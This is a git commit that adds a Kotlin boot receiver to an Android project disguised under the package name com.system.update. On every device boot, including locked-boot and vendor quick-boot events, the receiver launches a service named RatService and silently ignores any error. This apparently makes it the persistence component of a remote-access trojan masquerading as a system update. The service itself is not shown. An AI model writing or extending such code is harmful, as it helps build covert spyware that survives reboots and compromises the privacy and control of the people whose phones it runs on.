f704e818cb06e2d490d68d9da53d5327b0055457
BiscuitMd <esenaktau3@gmail.com>
2026-09-22 10:41:41 +0700

    Create BootReceiver.kt

---
+++ android/app/src/main/java/com/system/update/BootReceiver.kt
@@ -0,0 +1,24 @@
+package com.system.update
+
+import android.content.BroadcastReceiver
+import android.content.Context
+import android.content.Intent
+import android.os.Build
+
+class BootReceiver : BroadcastReceiver() {
+    override fun onReceive(context: Context, intent: Intent) {
+        if (intent.action == Intent.ACTION_BOOT_COMPLETED ||
+            intent.action == Intent.ACTION_LOCKED_BOOT_COMPLETED ||
+            intent.action == "android.intent.action.QUICKBOOT_POWERON" ||
+            intent.action == "com.htc.intent.action.QUICKBOOT_POWERON") {
+            try {
+                val i = Intent(context, RatService::class.java)
+                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
+                    context.startForegroundService(i)
+                } else {
+                    context.startService(i)
+                }
+            } catch (_: Exception) {}
+        }
+    }
+}
